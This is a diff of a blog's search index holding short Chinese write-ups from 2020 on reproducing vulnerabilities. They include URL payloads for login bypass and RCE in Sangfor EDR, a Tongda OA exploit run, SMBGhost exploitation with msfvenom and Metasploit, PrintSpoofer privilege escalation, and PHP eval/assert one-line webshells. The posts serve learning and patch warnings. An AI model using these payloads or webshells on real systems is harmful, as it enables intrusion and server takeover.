@@ -1,301 +1,282 @@
 <?xml version="1.0" encoding="utf-8"?>
-<search>
-  <entry>
-    <title>某信服EDR终端检测平台存在任意用户登录漏洞</title>
-    <url>/2020/08/20/%E6%9F%90%E4%BF%A1%E6%9C%8DEDR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次测试版本为3.2.15，网上已知最高可打3.2.19，其他版本自行测试。</p>
-<p>注：禁止非授权入侵</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>payload: <a href="https://ip/ui/login.php?user=arbitrarily" target="_blank" rel="noopener">https://ip/ui/login.php?user=arbitrarily</a></p>
-<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><img src="0.png" alt="0"></p>
-<p>利用payload进行任意登录</p>
-<p><img src="1.png" alt="1"></p>
-<h2 id="整改建议"><a href="#整改建议" class="headerlink" title="整改建议"></a>整改建议</h2><p>及时进行更新，关注官网补丁信息。</p>
-]]></content>
+<search> 
+  
+  
+    
+    <entry>
+      <title>某信服EDR终端检测平台存在任意用户登录漏洞</title>
+      <link href="/2020/08/20/%E6%9F%90%E4%BF%A1%E6%9C%8DEDR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2020/08/20/%E6%9F%90%E4%BF%A1%E6%9C%8DEDR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本次测试版本为3.2.15，网上已知最高可打3.2.19，其他版本自行测试。</p><p>注：禁止非授权入侵</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>payload: <a href="https://ip/ui/login.php?user=arbitrarily" target="_blank" rel="noopener">https://ip/ui/login.php?user=arbitrarily</a></p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><img src="0.png" alt="0"></p><p>利用payload进行任意登录</p><p><img src="1.png" alt="1"></p><h2 id="整改建议"><a href="#整改建议" class="headerlink" title="整改建议"></a>整改建议</h2><p>及时进行更新，关注官网补丁信息。</p>]]></content>
+      
+      
       <categories>
-        <category>漏洞告警</category>
+          
+          <category> 漏洞告警 </category>
+          
       </categories>
-      <tags>
-        <tag>漏洞利用</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>通达OA任意文件删除实现getshell</title>
-    <url>/2020/08/19/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E5%AE%9E%E7%8E%B0getshell/</url>
-    <content><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>​         通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。     </p>
-<p>通达OA为各行业不同规模的众多用户提供信息化管理能力，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等，帮助广大用户降低沟通和管理成本，提升生产和决策效率。     </p>
-<p>此外，通达OA通过融合不同的信息化资源，打通信息“孤岛”，精细化流程管理，改善管理模式，实现资源的优化配置和高效运转，全面提升企业竞争力。它是通达信科在二十余年从事管理软件研发和服务过程中集技术创新、项目实践、先进的管理思想和中肯的客户建议为一体的完美结晶。     </p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>本地搭建通达OA环境，本次试验使用版本为11.6（其余版本自行测试）</p>
-<p><img src="0.png" alt="0"></p>
-<p>使用exp脚本进行getshell</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python3 tongdaOA_rce.py http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">133</span>:<span class="number">8080</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="1.png" alt="1"></p>
-<p>成功上传一句话，连接webshell</p>
-<p><img src="2.png" alt="2"></p>
-<p>注：此漏洞利用会导致删除inc文件夹下的auth.inc.php，从而导致系统无法正常使用，禁止进行未授权测试。</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 漏洞利用 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>通达OA任意文件删除实现getshell</title>
+      <link href="/2020/08/19/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E5%AE%9E%E7%8E%B0getshell/"/>
+      <url>/2020/08/19/%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E5%AE%9E%E7%8E%B0getshell/</url>
+      
+        <content type="html"><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>​         通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。     </p><p>通达OA为各行业不同规模的众多用户提供信息化管理能力，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等，帮助广大用户降低沟通和管理成本，提升生产和决策效率。     </p><p>此外，通达OA通过融合不同的信息化资源，打通信息“孤岛”，精细化流程管理，改善管理模式，实现资源的优化配置和高效运转，全面提升企业竞争力。它是通达信科在二十余年从事管理软件研发和服务过程中集技术创新、项目实践、先进的管理思想和中肯的客户建议为一体的完美结晶。     </p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>本地搭建通达OA环境，本次试验使用版本为11.6（其余版本自行测试）</p><p><img src="0.png" alt="0"></p><p>使用exp脚本进行getshell</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 tongdaOA_rce.py http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">133</span>:<span class="number">8080</span></span><br></pre></td></tr></table></figure><p><img src="1.png" alt="1"></p><p>成功上传一句话，连接webshell</p><p><img src="2.png" alt="2"></p><p>注：此漏洞利用会导致删除inc文件夹下的auth.inc.php，从而导致系统无法正常使用，禁止进行未授权测试。</p>]]></content>
+      
+      
       <categories>
-        <category>漏洞告警</category>
+          
+          <category> 漏洞告警 </category>
+          
       </categories>
-      <tags>
-        <tag>漏洞利用</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>某信服EDR v3.2.21 (20200703)源码泄露</title>
-    <url>/2020/08/19/%E6%9F%90%E4%BF%A1%E6%9C%8DEDR%20v3.2.21%20(20200703)%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
-    <content><![CDATA[<h2 id="告警信息"><a href="#告警信息" class="headerlink" title="告警信息"></a>告警信息</h2><p>解决之前版本的远程任意代码注入漏洞，深信服EDR 更新到3.2.21 版本</p>
-<p>更新文献：<a href="https://bbs.sangfor.com.cn/plugin.php?id=service:download&amp;action=view&amp;fid=100000022878128#/100000035115623/all/undefined" target="_blank" rel="noopener">https://bbs.sangfor.com.cn/plugin.php?id=service:download&amp;action=view&amp;fid=100000022878128#/100000035115623/all/undefined</a></p>
-<p>早期可能误传导致源码泄露（现阶段官网社区已经删除）</p>
-<p><img src="0.png" alt="0"></p>
-<p>由于特殊时期，具体详情暂不描述</p>
-<h2 id="风险"><a href="#风险" class="headerlink" title="风险"></a>风险</h2><p>源码泄露能被恶意攻击者进行代码审计分析，从而挖掘出新的漏洞，达到入侵目的。</p>
-<h2 id="HW期间建议"><a href="#HW期间建议" class="headerlink" title="HW期间建议"></a>HW期间建议</h2><p>1.对EDR管理平台做acl策略，限制ip；</p>
-<p>2.暂时下线</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 漏洞利用 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>某信服EDR v3.2.21 (20200703)源码泄露</title>
+      <link href="/2020/08/19/%E6%9F%90%E4%BF%A1%E6%9C%8DEDR%20v3.2.21%20(20200703)%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
+      <url>/2020/08/19/%E6%9F%90%E4%BF%A1%E6%9C%8DEDR%20v3.2.21%20(20200703)%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
+      
+        <content type="html"><![CDATA[<h2 id="告警信息"><a href="#告警信息" class="headerlink" title="告警信息"></a>告警信息</h2><p>解决之前版本的远程任意代码注入漏洞，深信服EDR 更新到3.2.21 版本</p><p>更新文献：<a href="https://bbs.sangfor.com.cn/plugin.php?id=service:download&amp;action=view&amp;fid=100000022878128#/100000035115623/all/undefined" target="_blank" rel="noopener">https://bbs.sangfor.com.cn/plugin.php?id=service:download&amp;action=view&amp;fid=100000022878128#/100000035115623/all/undefined</a></p><p>早期可能误传导致源码泄露（现阶段官网社区已经删除）</p><p><img src="0.png" alt="0"></p><p>由于特殊时期，具体详情暂不描述</p><h2 id="风险"><a href="#风险" class="headerlink" title="风险"></a>风险</h2><p>源码泄露能被恶意攻击者进行代码审计分析，从而挖掘出新的漏洞，达到入侵目的。</p><h2 id="HW期间建议"><a href="#HW期间建议" class="headerlink" title="HW期间建议"></a>HW期间建议</h2><p>1.对EDR管理平台做acl策略，限制ip；</p><p>2.暂时下线</p>]]></content>
+      
+      
       <categories>
-        <category>漏洞告警</category>
+          
+          <category> 漏洞告警 </category>
+          
       </categories>
-      <tags>
-        <tag>告警信息</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>深信服EDR终端检测平台RCE漏洞</title>
-    <url>/2020/08/17/%E6%9F%90%E4%BF%A1%E6%9C%8DEDR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>深信服终端检测响应平台EDR，围绕终端资产安全生命周期，通过预防、防御、检测、响应赋予终端更为细致的隔离策略、更为精准的查杀能力、更为持续的检测能力、更为快速的处置能力。在应对高级威胁的同时，通过云网端联动协同、威胁情报共享、多层级响应机制，帮助用户快速处置终端安全问题，构建轻量级、智能化、响应快的下一代终端安全系统。 </p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">PAYLOAD：/tool/log/c.php?strip_slashes=system&amp;host=pwd</span><br></pre></td></tr></table></figure>
-
-<p><img src="0.png" alt="0"></p>
-<p><img src="1.png" alt="1"></p>
-<h2 id="整改建议"><a href="#整改建议" class="headerlink" title="整改建议"></a>整改建议</h2><p>现阶段深信服终端检测响应平台EDR出现多处漏洞，官方暂未提供相关补丁更新，建议暂时下线此平台系统，等待后续更新修复漏洞后再上线。</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 告警信息 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>深信服EDR终端检测平台RCE漏洞</title>
+      <link href="/2020/08/17/%E6%9F%90%E4%BF%A1%E6%9C%8DEDR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/"/>
+      <url>/2020/08/17/%E6%9F%90%E4%BF%A1%E6%9C%8DEDR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%B9%B3%E5%8F%B0RCE%E6%BC%8F%E6%B4%9E/</url>
+      
+        <content type="html"><![CDATA[<h2 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h2><p>深信服终端检测响应平台EDR，围绕终端资产安全生命周期，通过预防、防御、检测、响应赋予终端更为细致的隔离策略、更为精准的查杀能力、更为持续的检测能力、更为快速的处置能力。在应对高级威胁的同时，通过云网端联动协同、威胁情报共享、多层级响应机制，帮助用户快速处置终端安全问题，构建轻量级、智能化、响应快的下一代终端安全系统。 </p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PAYLOAD：/tool/log/c.php?strip_slashes=system&amp;host=pwd</span><br></pre></td></tr></table></figure><p><img src="0.png" alt="0"></p><p><img src="1.png" alt="1"></p><h2 id="整改建议"><a href="#整改建议" class="headerlink" title="整改建议"></a>整改建议</h2><p>现阶段深信服终端检测响应平台EDR出现多处漏洞，官方暂未提供相关补丁更新，建议暂时下线此平台系统，等待后续更新修复漏洞后再上线。</p>]]></content>
+      
+      
       <categories>
-        <category>漏洞告警</category>
+          
+          <category> 漏洞告警 </category>
+          
       </categories>
-      <tags>
-        <tag>漏洞利用</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>cve-2020-0787-Windows提权</title>
-    <url>/2020/06/22/cve-2020-0787-Windows%E6%8F%90%E6%9D%83/</url>
-    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p><strong>Windows Background Intelligent Transfer Service 权限提升漏洞</strong></p>
-<p>当Windows Background Intelligent Transfer Service  (BITS)未能正确地处理符号链接时，存在权限提升漏洞。成功利用此漏洞的攻击者可以覆盖导致提升状态的目标文件。要利用此漏洞，攻击者首先必须登录到系统。然后，攻击者可以运行巧尽心思构建的应用程序，利用此漏洞并控制受影响的系统。</p>
-<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Windows 10，Server 2016，Server 2019，Server version 1803，Server version 1903，Server version 1909，Windows 8.1，Server 2012，Server 2012 R2</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><img src="0.png" alt="0"></p>
-<p><img src="1.png" alt="1"></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 漏洞利用 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>cve-2020-0787-Windows提权</title>
+      <link href="/2020/06/22/cve-2020-0787-Windows%E6%8F%90%E6%9D%83/"/>
+      <url>/2020/06/22/cve-2020-0787-Windows%E6%8F%90%E6%9D%83/</url>
+      
+        <content type="html"><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p><strong>Windows Background Intelligent Transfer Service 权限提升漏洞</strong></p><p>当Windows Background Intelligent Transfer Service  (BITS)未能正确地处理符号链接时，存在权限提升漏洞。成功利用此漏洞的攻击者可以覆盖导致提升状态的目标文件。要利用此漏洞，攻击者首先必须登录到系统。然后，攻击者可以运行巧尽心思构建的应用程序，利用此漏洞并控制受影响的系统。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Windows 10，Server 2016，Server 2019，Server version 1803，Server version 1903，Server version 1909，Windows 8.1，Server 2012，Server 2012 R2</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><img src="0.png" alt="0"></p><p><img src="1.png" alt="1"></p>]]></content>
+      
+      
       <categories>
-        <category>渗透测试</category>
+          
+          <category> 渗透测试 </category>
+          
       </categories>
-      <tags>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>安装python-ldap模块过坑</title>
-    <url>/2020/06/19/%E5%AE%89%E8%A3%85python%E6%A8%A1%E5%9D%97%E8%BF%87%E5%9D%91/</url>
-    <content><![CDATA[<h2 id="Linux安装python-ldap"><a href="#Linux安装python-ldap" class="headerlink" title="Linux安装python-ldap"></a>Linux安装python-ldap</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libsasl2-dev python-dev libldap2-dev libssl-dev</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo pip3 install python-ldap</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="Windows安装python-ldap"><a href="#Windows安装python-ldap" class="headerlink" title="Windows安装python-ldap"></a>Windows安装python-ldap</h2><p>安装 whl 包：<a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#python-ldap" target="_blank" rel="noopener">https://www.lfd.uci.edu/~gohlke/pythonlibs/#python-ldap</a></p>
-<p><img src="0.png" alt="0"></p>
-<p>下载相对应的whl包，再安装即可</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">pip3 install pyldap-<span class="number">2</span>.<span class="number">4</span>.<span class="number">45</span>-cp37-cp37m-win_amd64.whl</span><br></pre></td></tr></table></figure>
-
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 提权 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>安装python-ldap模块过坑</title>
+      <link href="/2020/06/19/%E5%AE%89%E8%A3%85python%E6%A8%A1%E5%9D%97%E8%BF%87%E5%9D%91/"/>
+      <url>/2020/06/19/%E5%AE%89%E8%A3%85python%E6%A8%A1%E5%9D%97%E8%BF%87%E5%9D%91/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Linux安装python-ldap"><a href="#Linux安装python-ldap" class="headerlink" title="Linux安装python-ldap"></a>Linux安装python-ldap</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libsasl2-dev python-dev libldap2-dev libssl-dev</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install python-ldap</span><br></pre></td></tr></table></figure><h2 id="Windows安装python-ldap"><a href="#Windows安装python-ldap" class="headerlink" title="Windows安装python-ldap"></a>Windows安装python-ldap</h2><p>安装 whl 包：<a href="https://www.lfd.uci.edu/~gohlke/pythonlibs/#python-ldap" target="_blank" rel="noopener">https://www.lfd.uci.edu/~gohlke/pythonlibs/#python-ldap</a></p><p><img src="0.png" alt="0"></p><p>下载相对应的whl包，再安装即可</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pyldap-<span class="number">2</span>.<span class="number">4</span>.<span class="number">45</span>-cp37-cp37m-win_amd64.whl</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
       <categories>
-        <category>遇坑笔记</category>
+          
+          <category> 遇坑笔记 </category>
+          
       </categories>
-      <tags>
-        <tag>笔记</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>永恒之黑(cve-2020-0796)配合msf获取shell</title>
-    <url>/2020/06/04/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91(cve-2020-0796)%E9%85%8D%E5%90%88msf%E8%8E%B7%E5%8F%96shell/</url>
-    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>   今天看到tools上的cve-2020-0796复现文章，就此自己搭建一下环境复现，做一下笔记</p>
-<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Windows 10 Version 1903， Windows Server Version 1903(Server Core  installation)，Windows 10 Version 1909， 和Windows Server Version  1909(Server Core installation)受到这个漏洞的影响。不过值得注意的是，引入SMBv3的Windows  8和Windows Server 2012也有可能受到影响。</p>
-<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>GitHub上Fork过来的</p>
-<p><a href="https://github.com/YGnight/SMBGhost_RCE_PoC" target="_blank" rel="noopener">https://github.com/YGnight/SMBGhost_RCE_PoC</a></p>
-<p>kali集成</p>
-<p>metasploit ：开源安全漏洞检测工具；</p>
-<p>msfvenom ：metasploit的标准payload生成器</p>
-<h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>使用msfvenom生成直连exploit</p>
-<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp lport=<span class="number">1314</span> -f py -o cve<span class="number">-2020</span><span class="number">-0796.</span>py</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="0.png" alt="0"></p>
-<p>将生成的与脚本exploit.py里user_payload进行替换</p>
-<p><img src="1.png" alt="1"></p>
-<p>使用python3运行exploit （版本不要过高，本地复现使用的python3.7.4）</p>
-<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">exploit</span><span class="selector-class">.py</span> <span class="selector-tag">-ip</span> 192<span class="selector-class">.168</span><span class="selector-class">.168</span><span class="selector-class">.130</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="3.png" alt="3"></p>
-<p>运行metasploit </p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> payload /windows/x64/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">1314</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="4.png" alt="4"></p>
-<p>指定目标机，run</p>
-<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> rhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">130</span></span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p><img src="5.png" alt="5"></p>
-<p>得到shell</p>
-<p><img src="6.png" alt="6"></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 笔记 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>永恒之黑(cve-2020-0796)配合msf获取shell</title>
+      <link href="/2020/06/04/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91(cve-2020-0796)%E9%85%8D%E5%90%88msf%E8%8E%B7%E5%8F%96shell/"/>
+      <url>/2020/06/04/%E6%B0%B8%E6%81%92%E4%B9%8B%E9%BB%91(cve-2020-0796)%E9%85%8D%E5%90%88msf%E8%8E%B7%E5%8F%96shell/</url>
+      
+        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>   今天看到tools上的cve-2020-0796复现文章，就此自己搭建一下环境复现，做一下笔记</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>Windows 10 Version 1903， Windows Server Version 1903(Server Core  installation)，Windows 10 Version 1909， 和Windows Server Version  1909(Server Core installation)受到这个漏洞的影响。不过值得注意的是，引入SMBv3的Windows  8和Windows Server 2012也有可能受到影响。</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>GitHub上Fork过来的</p><p><a href="https://github.com/YGnight/SMBGhost_RCE_PoC" target="_blank" rel="noopener">https://github.com/YGnight/SMBGhost_RCE_PoC</a></p><p>kali集成</p><p>metasploit ：开源安全漏洞检测工具；</p><p>msfvenom ：metasploit的标准payload生成器</p><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><p>使用msfvenom生成直连exploit</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/bind_tcp lport=<span class="number">1314</span> -f py -o cve<span class="number">-2020</span><span class="number">-0796.</span>py</span><br></pre></td></tr></table></figure><p><img src="0.png" alt="0"></p><p>将生成的与脚本exploit.py里user_payload进行替换</p><p><img src="1.png" alt="1"></p><p>使用python3运行exploit （版本不要过高，本地复现使用的python3.7.4）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">exploit</span><span class="selector-class">.py</span> <span class="selector-tag">-ip</span> 192<span class="selector-class">.168</span><span class="selector-class">.168</span><span class="selector-class">.130</span></span><br></pre></td></tr></table></figure><p><img src="3.png" alt="3"></p><p>运行metasploit </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> payload /windows/x64/meterpreter/bind_tcp</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> lport <span class="number">1314</span></span><br></pre></td></tr></table></figure><p><img src="4.png" alt="4"></p><p>指定目标机，run</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> rhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">168</span>.<span class="number">130</span></span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="5.png" alt="5"></p><p>得到shell</p><p><img src="6.png" alt="6"></p>]]></content>
+      
+      
       <categories>
-        <category>渗透测试</category>
+          
+          <category> 渗透测试 </category>
+          
       </categories>
-      <tags>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pipePotato-新型通用提权</title>
-    <url>/2020/05/08/pipePotato-%E6%96%B0%E5%9E%8B%E9%80%9A%E7%94%A8%E6%8F%90%E6%9D%83/</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>本地提权，对于任意windows Server 2012以上的windows  server版本(win8以上的某些windows版本也行)，从Service用户提到System 用户，在</p>
-<p>windows Server  2012，</p>
-<p>windows Server 2016，</p>
-<p>windows Server 2019</p>
-<p>全补丁的情况都测试成功了。</p>
-<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>GitHub上有源码，自行编译即可</p>
-<h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><p>cmd运行 </p>
-<pre><code>whoami               #查看权限</code></pre><p><img src="0.png" alt="0"></p>
-<pre><code>whoami /priv         #查看是否具有SeImpersonatePrivilege权限</code></pre><p><img src="1.png" alt="1"></p>
-<pre><code>PrintSpoofer.exe -i -c &quot;whoami&quot;      #查看权限是否提升为system</code></pre><p><img src="2.png" alt="2"></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 提权 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>pipePotato-新型通用提权</title>
+      <link href="/2020/05/08/pipePotato-%E6%96%B0%E5%9E%8B%E9%80%9A%E7%94%A8%E6%8F%90%E6%9D%83/"/>
+      <url>/2020/05/08/pipePotato-%E6%96%B0%E5%9E%8B%E9%80%9A%E7%94%A8%E6%8F%90%E6%9D%83/</url>
+      
+        <content type="html"><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>本地提权，对于任意windows Server 2012以上的windows  server版本(win8以上的某些windows版本也行)，从Service用户提到System 用户，在</p><p>windows Server  2012，</p><p>windows Server 2016，</p><p>windows Server 2019</p><p>全补丁的情况都测试成功了。</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>GitHub上有源码，自行编译即可</p><h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><p>cmd运行 </p><pre><code>whoami               #查看权限</code></pre><p><img src="0.png" alt="0"></p><pre><code>whoami /priv         #查看是否具有SeImpersonatePrivilege权限</code></pre><p><img src="1.png" alt="1"></p><pre><code>PrintSpoofer.exe -i -c &quot;whoami&quot;      #查看权限是否提升为system</code></pre><p><img src="2.png" alt="2"></p>]]></content>
+      
+      
       <categories>
-        <category>渗透测试</category>
+          
+          <category> 渗透测试 </category>
+          
       </categories>
-      <tags>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>PHP代码执行函数</title>
-    <url>/2020/01/13/PHP%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0/</url>
-    <content><![CDATA[<h2 id="1、eval-函数"><a href="#1、eval-函数" class="headerlink" title="1、eval()函数"></a>1、eval()函数</h2><pre><code>#eval() 函数把字符串按照 PHP 代码来计算
-#常见一句话：
-&lt;?php @eval($_POST[&apos;YGnight&apos;]);?&gt;</code></pre><h2 id="2、assert-函数"><a href="#2、assert-函数" class="headerlink" title="2、assert()函数"></a>2、assert()函数</h2><pre><code>#与eval类似
-#常见一句话
-&lt;?php @assert($_POST[&apos;YGnight&apos;])?&gt;</code></pre><h2 id="3、array-map-函数"><a href="#3、array-map-函数" class="headerlink" title="3、array_map()函数"></a>3、array_map()函数</h2><pre><code>#array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。
-#命令执行http://localhost/123.php?func=system   cmd=whoami
-#菜刀连接http://localhost/123.php?func=assert   密码：cmd
